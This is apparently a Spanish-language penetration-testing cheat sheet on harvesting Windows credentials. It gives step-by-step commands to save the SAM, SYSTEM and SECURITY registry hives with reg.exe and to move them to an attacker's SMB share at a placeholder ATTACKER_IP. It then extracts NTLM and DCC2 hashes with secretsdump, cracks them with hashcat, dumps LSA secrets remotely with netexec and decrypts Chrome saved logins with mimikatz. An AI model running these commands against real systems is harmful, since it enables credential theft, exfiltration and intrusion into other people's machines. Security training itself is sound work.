---
tags:
  - windows
  - sam
  - system
  - security
---
## Conceptos Clave (TL;DR)

* Con acceso de administrador en Windows, se pueden extraer las colmenas del registro de forma local para volcar y crackear hashes de manera offline.

* **HKLM\SAM:** Contiene los hashes de las cuentas de usuario locales.

* **HKLM\SYSTEM:** Contiene la "boot key" del sistema, indispensable para poder desencriptar la base de datos SAM.

* **HKLM\SECURITY:** Almacena informacion de la Local Security Authority (LSA), incluyendo credenciales cacheadas de dominio (DCC2), contraseñas en texto claro y llaves de DPAPI.

* **DPAPI (Data Protection API):** APIs de Windows usadas para encriptar datos por usuario, como contraseñas autocompletadas en navegadores (Chrome/IE), Outlook y RDP.

  
## Herramientas Clave

* **reg.exe:** Utilidad nativa de Windows para guardar copias de las colmenas del registro.
* **smbserver.py (Impacket):** Script para levantar un recurso compartido SMB en el equipo atacante y facilitar la transferencia de archivos.
* **secretsdump.py (Impacket):** Herramienta para parsear y extraer hashes, secretos LSA y llaves DPAPI desde los archivos de las colmenas volcadas.
* **[Hashcat](../../../📂%2008%20Herramientas&Cheatsheets/Hashcat.md):** Empleado para el crackeo offline de hashes NT (modo 1000) y DCC2 (modo 2100).
* **[NetExec](../../../📂%2008%20Herramientas&Cheatsheets/NetExec.md):** Framework utilizado para volcar la SAM o los secretos LSA de forma remota a traves de SMB si ya se cuenta con credenciales administrativas.
* **mimikatz:** Utilizado para desencriptar localmente datos protegidos por DPAPI.
  

## Metodologia Paso a Paso

1. **Fase de Extraccion Local:** Desde una terminal con privilegios administrativos en el objetivo, se guardan copias locales de las colmenas fundamentales (SAM, SYSTEM, SECURITY) utilizando `reg.exe`.

2. **Fase de Transferencia:** Se levanta un servidor SMB en el host del atacante para recibir los archivos. Luego, desde la maquina objetivo, se utiliza el comando `move` o `copy` para enviar las colmenas al recurso compartido.

3. **Fase de Volcado Offline:** En el equipo atacante, se alimenta la herramienta `secretsdump.py` con las colmenas transferidas. El script utilizara SYSTEM para descifrar SAM y SECURITY, obteniendo los hashes (ej. NTLM), llaves DPAPI y secretos LSA.

4. **Fase de Crackeo:** Se filtran los hashes obtenidos (usualmente NT hashes para usuarios locales o DCC2 para credenciales de dominio cacheadas) y se crackean utilizando un diccionario con `Hashcat`.

5. **Alternativa - Volcado Remoto:** Si ya se dispone de credenciales de un administrador local o de dominio, esta operacion puede realizarse remotamente utilizando `netexec` para extraer directamente los secretos de LSA o la SAM sobre la red, sin necesidad de ejecutar comandos en disco de forma interactiva.

## Cheat Sheet de Comandos
```cmd
# --------------------------------------------
# 1. EXTRACCION DE COLMENAS (En Target CMD como Admin)
# Guarda copias del registro en el directorio actual (o la ruta especificada)
# ---------------------------------------------

reg.exe save hklm\sam <OUTPUT_DIR>\sam.save
reg.exe save hklm\system <OUTPUT_DIR>\system.save
reg.exe save hklm\security <OUTPUT_DIR>\security.save

 
# ---------------------------------------------
# 2. TRANSFERENCIA (En Attacker y Target)
# Levanta un server SMB compatible con maquinas modernas
# ---------------------------------------------

# En Attacker Linux:

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <SHARE_NAME> <LOCAL_DIR>

  
# En Target Windows (Mover los archivos al server del atacante):

move sam.save \\<ATTACKER_IP>\<SHARE_NAME>
move system.save \\<ATTACKER_IP>\<SHARE_NAME>
move security.save \\<ATTACKER_IP>\<SHARE_NAME>

  

# ---------------------------------------------
# 3. VOLCADO OFFLINE DE HASHES (En Attacker)
# Extrae credenciales, llaves de DPAPI y secretos de las colmenas
# ---------------------------------------------

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

  
# ---------------------------------------------
# 4. CRACKEO DE HASHES CON HASHCAT (En Attacker)
# -m 1000 = Hashes NTLM (Usuarios locales/SAM)
# -m 2100 = Hashes DCC2 (Credenciales cacheadas de dominio)
# ---------------------------------------------

# Crackear NT Hashes

sudo hashcat -m 1000 <HASH_FILE_NTLM> <WORDLIST_PATH>

  
# Crackear DCC2 Hashes

sudo hashcat -m 2100 <HASH_FILE_DCC2> <WORDLIST_PATH>

  
# ---------------------------------------------
# 5. EXTRACCION REMOTA (En Attacker - Requiere credenciales)
# Usa netexec para dumpear LSA y SAM por red (SMB)
# ---------------------------------------------

# Dumpear secretos LSA remotamente (local-auth)

netexec smb <TARGET_IP> --local-auth -u <USER> -p <PASSWORD> --lsa

  
# Dumpear SAM remotamente (local-auth)

netexec smb <TARGET_IP> --local-auth -u <USER> -p <PASSWORD> --sam

  
# ---------------------------------------------
# 6. EXTRACCION DPAPI LOCAL (En Target con Mimikatz)
# Desencriptar datos de navegadores (ej. Chrome)
# ---------------------------------------------

mimikatz.exe

dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## "Gotchas" y Troubleshooting

* **Error de conexion SMB en transferencias:** Al levantar `smbserver.py`, es estricto incluir la bandera `-smb2support`. Si no se incluye, Windows modernos rechazaran la conexion porque SMBv1 suele estar deshabilitado por seguridad.

* **No se puede volcar la SAM:** Asegurarse de tener el archivo `system.save`. Sin la bootkey almacenada en la colmena SYSTEM, es imposible desencriptar los hashes de la SAM.

* **Lentitud extrema en Hashcat:** Si estas crackeando hashes de `hklm\security` formateados como `$DCC2$10240#...`, ten en cuenta que utilizan derivacion PBKDF2 y son aproximadamente 800 veces mas lentos de crackear que los hashes NT regulares. Usa reglas eficientes o diccionarios precisos.

* **Limitaciones DCC2:** A diferencia de los NT hashes regulares, los hashes DCC2 no sirven para realizar ataques de "Pass-the-Hash" para movimiento lateral.

* **Hashes LM:** En sistemas antiguos (anteriores a Windows Vista/Server 2008), podrías extraer hashes LM. Prioriza crackear estos si existen, ya que son criptograficamente mas debiles y rapidos de romper.